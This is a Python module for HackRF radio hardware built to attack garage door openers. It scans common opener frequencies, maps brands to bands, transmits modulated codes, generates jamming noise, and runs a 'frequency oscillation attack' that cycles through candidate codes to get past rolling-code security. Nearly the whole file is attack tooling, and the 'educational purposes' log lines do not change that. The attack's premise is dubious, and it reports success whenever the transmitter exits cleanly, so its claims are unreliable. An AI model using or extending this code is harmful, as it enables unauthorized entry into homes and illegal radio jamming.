#!/usr/bin/env python3
"""
Frequency Handler Module

Provides functionality for handling frequency operations, including oscillation
and signal generation for garage door systems using HackRF hardware.
No simulation fallbacks available - requires actual hardware.
"""

import logging
import numpy as np
import time
import subprocess
import os
from typing import Dict, List, Optional, Tuple, Union

# Import HackRF as a hard dependency
import hackrf

class FrequencyHandler:
    """Class for handling frequency-related operations."""
    
    def __init__(self, center_freq: float = 315e6, bandwidth: float = 2e6):
        """
        Initialize the frequency handler.
        
        Args:
            center_freq: Center frequency in Hz (default: 315 MHz)
            bandwidth: Bandwidth in Hz (default: 2 MHz)
            
        Raises:
            ValueError: If frequency or bandwidth parameters are invalid
        """
        self.center_freq = center_freq
        self.bandwidth = bandwidth
        self._cache = {}  # Performance optimization for repeated operations
        
        # Common garage door frequencies in Hz
        self.common_frequencies = {
            '300MHz': 300e6,
            '315MHz': 315e6,
            '318MHz': 318e6,
            '390MHz': 390e6,
            '433.92MHz': 433.92e6
        }
        
        # Validate frequency and bandwidth
        self._validate_frequency(center_freq)
        self._validate_bandwidth(bandwidth)
        
        logging.debug(f"Initialized FrequencyHandler with center_freq={self.center_freq/1e6} MHz, "
                     f"bandwidth={self.bandwidth/1e6} MHz")
    
    def _validate_frequency(self, freq: float) -> None:
        """Validate frequency is within supported range."""
        if not 300e6 <= freq <= 450e6:
            raise ValueError("Frequency must be between 300-450 MHz")
            
    def _validate_bandwidth(self, bw: float) -> None:
        """Validate bandwidth is reasonable."""
        if not 1e3 <= bw <= 20e6:
            raise ValueError("Bandwidth must be between 1 kHz and 20 MHz")
    
    def set_frequency(self, freq: float) -> None:
        """
        Set the center frequency.
        
        Args:
            freq: New center frequency in Hz
        """
        self.center_freq = freq
        logging.info(f"Set center frequency to {freq/1e6} MHz")
    
    def scan_frequencies(self, sample_rate: float, duration: float = 1.0) -> Dict[str, float]:
        """
        Scan common garage door frequencies and measure signal strength using HackRF hardware.
        
        Args:
            sample_rate: Sample rate in Hz
            duration: Duration to scan each frequency in seconds
            
        Returns:
            Dictionary mapping frequency names to signal strengths
            
        Raises:
            RuntimeError: If HackRF hardware is not available
        """
        logging.info("Scanning common garage door frequencies using HackRF")
        
        # Initialize HackRF device
        device = None
        try:
            device = hackrf.HackRF()
            device.sample_rate = sample_rate
            device.rx_gain = 20  # Default gain setting
            device.enable_amp = True
            
            results = {}
            
            for name, freq in self.common_frequencies.items():
                logging.info(f"Scanning {name} ({freq/1e6} MHz)")
                device.center_freq = freq
                
                # Capture short samples to measure strength
                device.start_rx_mode()
                time.sleep(0.5)  # Allow AGC to settle
                
                samples = device.read_samples(int(sample_rate * duration))
                device.stop_rx_mode()
                
                # Calculate power
                power = 10 * np.log10(np.mean(np.abs(samples) ** 2))
                results[name] = power
                logging.info(f"{name}: Signal strength = {power:.2f} dB")
                
                time.sleep(0.2)  # Brief pause between frequencies
            
            return results
            
        except Exception as e:
            logging.error(f"Error during frequency scan: {e}")
            raise RuntimeError(f"HackRF hardware error during frequency scan: {e}")
            
        finally:
            if device:
                try:
                    device.close()
                except:
                    pass
    
    def generate_modulated_signal(self, code: str, sample_rate: float, 
                                 modulation: str = 'OOK') -> np.ndarray:
        """
        Generate a modulated signal for the given code.
        
        Args:
            code: Binary code string to transmit
            sample_rate: Sample rate in Hz
            modulation: Modulation type ('OOK', 'FSK', 'PSK')
            
        Returns:
            Numpy array containing the modulated signal
        """
        logging.info(f"Generating {modulation} modulated signal for code: {code}")
        
        # Determine bit duration and symbol rate
        bit_duration = 0.001  # 1ms per bit
        samples_per_bit = int(sample_rate * bit_duration)
        
        # Create time base for one bit
        t_bit = np.arange(samples_per_bit) / sample_rate
        
        # Create the full signal
        signal = np.zeros(len(code) * samples_per_bit, dtype=complex)
        
        if modulation == 'OOK':
            # On-Off Keying modulation
            for i, bit in enumerate(code):
                if bit == '1':
                    # Generate carrier wave for this bit
                    start_idx = i * samples_per_bit
                    end_idx = (i + 1) * samples_per_bit
                    carrier = np.exp(2j * np.pi * 10000 * t_bit)  # 10kHz offset from center
                    signal[start_idx:end_idx] = carrier * 0.5  # Amplitude 0.5
        
        elif modulation == 'FSK':
            # Frequency Shift Keying
            freq_low = 5000   # Hz offset for '0'
            freq_high = 15000  # Hz offset for '1'
            
            for i, bit in enumerate(code):
                start_idx = i * samples_per_bit
                end_idx = (i + 1) * samples_per_bit
                
                if bit == '0':
                    carrier = np.exp(2j * np.pi * freq_low * t_bit)
                else:
                    carrier = np.exp(2j * np.pi * freq_high * t_bit)
                    
                signal[start_idx:end_idx] = carrier * 0.5
        
        elif modulation == 'PSK':
            # Phase Shift Keying
            for i, bit in enumerate(code):
                start_idx = i * samples_per_bit
                end_idx = (i + 1) * samples_per_bit
                
                if bit == '0':
                    carrier = np.exp(2j * np.pi * 10000 * t_bit)  # 0 phase
                else:
                    carrier = np.exp(2j * np.pi * 10000 * t_bit + np.pi)  # 180 degree phase
                    
                signal[start_idx:end_idx] = carrier * 0.5
        
        else:
            logging.error(f"Unsupported modulation type: {modulation}")
            return np.array([])
        
        logging.info(f"Generated signal with {len(signal)} samples")
        return signal
    
    def transmit_signal(self, code: str, modulation: str = 'OOK', 
                        sample_rate: float = 2e6, repeat_count: int = 3, tx_gain: float = 20.0) -> bool:
        """
        Transmit a signal using HackRF hardware.
        
        Args:
            code: Binary code to transmit
            modulation: Modulation type ('OOK', 'FSK', 'PSK')
            sample_rate: Sample rate in Hz
            repeat_count: Number of times to repeat the transmission
            tx_gain: Transmitter gain (0-47 dB)
            
        Returns:
            True if transmission was successful, False otherwise
            
        Raises:
            RuntimeError: If HackRF hardware is not available or encounters an error
        """
        logging.info(f"Transmitting {modulation} signal for code: {code} using HackRF")
        
        # Generate the modulated signal
        signal = self.generate_modulated_signal(code, sample_rate, modulation)
        
        if len(signal) == 0:
            logging.error("Failed to generate signal")
            return False
            
        # Initialize HackRF device
        device = None
        try:
            device = hackrf.HackRF()
            device.sample_rate = sample_rate
            device.enable_tx = True
            device.tx_gain = min(47, max(0, tx_gain))  # Clamp to valid range
            device.center_freq = self.center_freq
            
            logging.info(f"Transmitting at {self.center_freq/1e6:.3f} MHz with gain {tx_gain} dB")
            
            # Transmit the signal multiple times
            for i in range(repeat_count):
                logging.info(f"Transmission {i+1}/{repeat_count}")
                device.start_tx_mode()
                device.write_samples(signal)
                device.stop_tx_mode()
                time.sleep(0.1)  # Brief pause between transmissions
                
            logging.info("Transmission complete")
            return True
            
        except Exception as e:
            logging.error(f"Error during transmission: {e}")
            raise RuntimeError(f"HackRF hardware error during transmission: {e}")
            
        finally:
            if device:
                try:
                    device.disable_tx = True
                    device.close()
                except:
                    pass
    
    def jam_frequency(self, duration: float, sample_rate: float, 
                     jam_bandwidth: Optional[float] = None) -> np.ndarray:
        """
        Generate a jamming signal for the current frequency.
        
        Args:
            duration: Duration of jamming in seconds
            sample_rate: Sample rate in Hz
            jam_bandwidth: Bandwidth of jamming in Hz (default: use instance bandwidth)
            
        Returns:
            Numpy array containing jamming signal
        """
        logging.warning(f"Generating jamming signal at {self.center_freq/1e6} MHz "
                      f"for {duration} seconds")
        
        if jam_bandwidth is None:
            jam_bandwidth = self.bandwidth
            
        # Number of samples
        num_samples = int(duration * sample_rate)
        
        # Generate white noise
        noise = (np.random.normal(0, 1, num_samples) + 
                1j * np.random.normal(0, 1, num_samples))
        
        # Filter the noise to the desired bandwidth using HackRF
        # The real transmission will use hardware-based filtering
        
        logging.warning("Jamming signal generated - for educational purposes only")
        return noise
    
    def frequency_hop(self, hop_pattern: List[float], dwell_time: float,
                     sample_rate: float) -> np.ndarray:
        """
        Generate a frequency hopping signal.
        
        Args:
            hop_pattern: List of frequencies (Hz) to hop between
            dwell_time: Time to spend at each frequency (seconds)
            sample_rate: Sample rate in Hz
            
        Returns:
            Numpy array containing the hopping signal
        """
        logging.info(f"Generating frequency hopping signal with {len(hop_pattern)} hops")
        
        # Calculate samples per hop
        samples_per_hop = int(dwell_time * sample_rate)
        
        # Generate signal for each hop frequency
        hopping_signal = np.array([], dtype=complex)
        
        for freq in hop_pattern:
            # Time base for this hop
            t_hop = np.arange(samples_per_hop) / sample_rate
            
            # Generate carrier at this frequency
            freq_offset = freq - self.center_freq  # Offset from center
            carrier = np.exp(2j * np.pi * freq_offset * t_hop)
            
            # Add this hop to the signal
            hopping_signal = np.append(hopping_signal, carrier * 0.5)
        
        logging.info(f"Generated hopping signal with {len(hopping_signal)} samples")
        return hopping_signal
    
    def get_compatible_devices(self) -> Dict[str, List[str]]:
        """
        Get a list of known garage door opener brands compatible with current frequency.
        
        Returns:
            Dictionary mapping frequencies to compatible devices
        """
        # Database of known garage door opener frequencies
        device_database = {
            300e6: ['Stanley', 'GTO'],
            315e6: ['Chamberlain', 'LiftMaster', 'Craftsman', 'Genie', 'Linear'],
            318e6: ['Chamberlain (older models)', 'Multi-Code'],
            390e6: ['Chamberlain (Canada)', 'LiftMaster (Canada)'],
            433.92e6: ['CAME', 'NICE', 'FAAC', 'BFT', 'European brands']
        }
        
        # Find compatible devices based on current frequency
        compatible_devices = {}
        for freq, devices in device_database.items():
            # Check if current frequency is close to this one
            freq_mhz = freq / 1e6
            current_freq_mhz = self.center_freq / 1e6
            
            if abs(current_freq_mhz - freq_mhz) < 1:  # Within 1 MHz
                compatible_devices[f"{freq_mhz} MHz"] = devices
        
        if not compatible_devices:
            logging.info(f"No known compatible devices for {self.center_freq/1e6} MHz")
            return {f"{self.center_freq/1e6} MHz": ["Unknown"]}
        
        logging.info(f"Found {sum(len(d) for d in compatible_devices.values())} "
                    f"compatible devices in {len(compatible_devices)} frequency bands")
        return compatible_devices
        
    def oscillate_frequency(self, center_freq: float, bandwidth: float, 
                           oscillation_rate: float, duration: float,
                           sample_rate: float = 2e6, pattern: str = 'sinusoidal') -> np.ndarray:
        """
        Generate a signal that oscillates around the center frequency.
        For direct HackRF hardware implementation.
        
        Args:
            center_freq: Center frequency in Hz
            bandwidth: Bandwidth of oscillation in Hz
            oscillation_rate: Rate of oscillation in Hz (cycles per second)
            duration: Duration of oscillation in seconds
            sample_rate: Sample rate in Hz
            pattern: Oscillation pattern ('sinusoidal', 'triangular', 'sawtooth', 'random')
            
        Returns:
            Numpy array containing the oscillating signal
        """
        logging.info(f"Generating frequency oscillation around {center_freq/1e6} MHz, "
                    f"bandwidth={bandwidth/1e6} MHz, rate={oscillation_rate} Hz")
        logging.info(f"Using oscillation pattern: {pattern}")
        
        # Number of samples
        num_samples = int(duration * sample_rate)
        
        # Generate time base
        t = np.arange(num_samples) / sample_rate
        
        # Generate frequency deviation pattern based on the selected pattern
        if pattern == 'sinusoidal':
            # Sinusoidal oscillation (smooth frequency changes)
            freq_offset = bandwidth/2 * np.sin(2 * np.pi * oscillation_rate * t)
        
        elif pattern == 'triangular':
            # Triangular oscillation (linear frequency ramps)
            period = 1.0 / oscillation_rate
            # Create a triangular wave using sawtooth with modified duty cycle
            freq_offset = bandwidth/2 * (2 * np.abs(2 * (t / period - np.floor(t / period + 0.5))) - 1)
            
        elif pattern == 'sawtooth':
            # Sawtooth oscillation (rapid drop, slow rise)
            period = 1.0 / oscillation_rate
            # Create a sawtooth wave
            freq_offset = bandwidth/2 * (2 * (t / period - np.floor(t / period + 0.5)))
            
        elif pattern == 'random':
            # Random jumps - changes frequency in small random steps
            # This can be effective against some rolling code systems
            steps = int(oscillation_rate * duration)
            step_samples = int(num_samples / steps)
            
            # Generate random frequency offsets for each step
            random_offsets = np.random.uniform(-bandwidth/2, bandwidth/2, steps)
            
            # Smooth transitions between random values to avoid phase discontinuities
            freq_offset = np.zeros(num_samples)
            for i in range(steps):
                start_idx = i * step_samples
                end_idx = min((i + 1) * step_samples, num_samples)
                
                if i < steps - 1:
                    # Create smooth transition to next value
                    transition = np.linspace(random_offsets[i], random_offsets[i+1], end_idx - start_idx)
                    freq_offset[start_idx:end_idx] = transition
                else:
                    # Last segment
                    freq_offset[start_idx:end_idx] = random_offsets[i]
        
        else:
            logging.warning(f"Unknown pattern '{pattern}', falling back to sinusoidal")
            freq_offset = bandwidth/2 * np.sin(2 * np.pi * oscillation_rate * t)
            
        # Generate complex signal with oscillating frequency
        # Integrate frequency to get phase (cumulative sum of frequency * delta_t)
        phase = 2 * np.pi * np.cumsum(freq_offset) / sample_rate
        signal = 0.5 * np.exp(1j * phase)  # 0.5 amplitude for HackRF direct use
        
        logging.info(f"Generated oscillating signal with {len(signal)} samples")
        logging.debug(f"Signal phase variance: {np.var(phase)}")
        
        # Apply tapering to reduce spectral leakage at the start and end
        taper_len = min(int(0.01 * num_samples), 1000)  # 1% of total or 1000 samples max
        taper_window = np.ones(num_samples)
        taper_window[:taper_len] = np.linspace(0, 1, taper_len)
        taper_window[-taper_len:] = np.linspace(1, 0, taper_len)
        
        # Apply the taper
        signal = signal * taper_window
        
        return signal
        
    def frequency_sweep(self, start_freq: float, end_freq: float, 
                       sweep_time: float, sample_rate: float = 2e6) -> np.ndarray:
        """
        Generate a linear frequency sweep (chirp) signal.
        
        Args:
            start_freq: Starting frequency in Hz
            end_freq: Ending frequency in Hz
            sweep_time: Time to complete sweep in seconds
            sample_rate: Sample rate in Hz
            
        Returns:
            Numpy array containing the sweep signal
        """
        logging.info(f"Generating frequency sweep from {start_freq/1e6} MHz to {end_freq/1e6} MHz "
                   f"over {sweep_time} seconds")
        
        # Number of samples
        num_samples = int(sweep_time * sample_rate)
        
        # Generate time base
        t = np.arange(num_samples) / sample_rate
        
        # Generate linear frequency sweep
        # Instantaneous frequency follows f(t) = f0 + (f1-f0)*(t/T)
        freq_offset = start_freq + (end_freq - start_freq) * (t / sweep_time)
        
        # Adjust for center frequency
        rel_freq = freq_offset - self.center_freq
        
        # Calculate phase (integral of instantaneous frequency)
        # For linear sweep: phi(t) = 2*pi*(f0*t + (f1-f0)*t^2/(2*T))
        phase = 2*np.pi * (rel_freq[0]*t + 0.5*(rel_freq[-1]-rel_freq[0])*(t**2)/sweep_time)
        
        # Generate complex signal
        signal = 0.5 * np.exp(1j * phase)  # 0.5 amplitude
        
        logging.info(f"Generated sweep signal with {len(signal)} samples")
        return signal
        
    def transmit_code(self, code: str, modulation: str = 'OOK') -> bool:
        """
        Transmit a code using the external transmitter program.
        
        Args:
            code: Binary code string to transmit
            modulation: Modulation type ('OOK', 'FSK', 'PSK')
            
        Returns:
            True if transmission was successful, False otherwise
        """
        logging.warning(f"Attempting to transmit code: {code} using {modulation} modulation")
        
        try:
            # Convert frequency to MHz for the external program
            freq_mhz = self.center_freq / 1e6
            
            # Call the external C program for transmission
            cmd = ['./transmitter', '-f', str(freq_mhz), '-c', code]
            logging.info(f"Executing: {' '.join(cmd)}")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                logging.info(f"Transmission succeeded: {result.stdout.strip()}")
                return True
            else:
                logging.error(f"Transmission failed: {result.stderr.strip()}")
                return False
                
        except subprocess.TimeoutExpired:
            logging.error("Transmission timed out")
            return False
        except Exception as e:
            logging.error(f"Error during transmission: {e}")
            return False
            
    def frequency_oscillation_attack(self, target_freq: float, code_list: List[str], 
                                    oscillation_pattern: str = 'linear',
                                    attack_duration: float = 30.0) -> bool:
        """
        Perform a frequency oscillation attack to attempt to bypass rolling code security.
        
        This method attempts to exploit vulnerabilities in some garage door systems by rapidly
        oscillating around the target frequency while transmitting different codes.
        
        Args:
            target_freq: Target frequency in Hz
            code_list: List of potential codes to try
            oscillation_pattern: Type of oscillation ('linear', 'sinusoidal', 'random')
            attack_duration: Total duration of attack in seconds
            
        Returns:
            True if any transmission was acknowledged, False otherwise
        """
        logging.warning(f"Starting frequency oscillation attack on {target_freq/1e6} MHz")
        logging.warning("This is for educational purposes and security research only")
        
        if not code_list:
            logging.error("No codes provided for attack")
            return False
            
        # Set to target frequency
        original_freq = self.center_freq
        self.center_freq = target_freq
        
        # Calculate timing
        codes_count = len(code_list)
        time_per_code = attack_duration / codes_count
        
        # Track success
        success = False
        
        try:
            for i, code in enumerate(code_list):
                logging.info(f"Trying code {i+1}/{codes_count}: {code}")
                
                # Calculate frequency offset based on pattern
                if oscillation_pattern == 'linear':
                    # Linear sweep around target frequency
                    offset_range = 100e3  # 100 kHz range
                    current_freq = target_freq + (i - codes_count/2) * (offset_range / codes_count)
                    
                elif oscillation_pattern == 'sinusoidal':
                    # Sinusoidal oscillation
                    offset_range = 150e3  # 150 kHz range
                    phase = (i / codes_count) * 2 * np.pi
                    current_freq = target_freq + offset_range * np.sin(phase)
                    
                elif oscillation_pattern == 'random':
                    # Random frequency within range
                    offset_range = 200e3  # 200 kHz range
                    current_freq = target_freq + (np.random.random() - 0.5) * offset_range
                    
                else:
                    current_freq = target_freq
                
                # Set to current frequency in the oscillation pattern
                self.center_freq = current_freq
                logging.info(f"Oscillated to {current_freq/1e6} MHz")
                
                # Attempt transmission
                if self.transmit_code(code, modulation='OOK'):
                    logging.warning(f"Possible success with code: {code} at {current_freq/1e6} MHz")
                    success = True
                    
                # Brief pause between attempts
                time.sleep(time_per_code)
                
            # Restore original frequency
            self.center_freq = original_freq
            return success
            
        except KeyboardInterrupt:
            logging.warning("Attack interrupted by user")
            self.center_freq = original_freq
            return False
        except Exception as e:
            logging.error(f"Error during attack: {e}")
            self.center_freq = original_freq
            return False
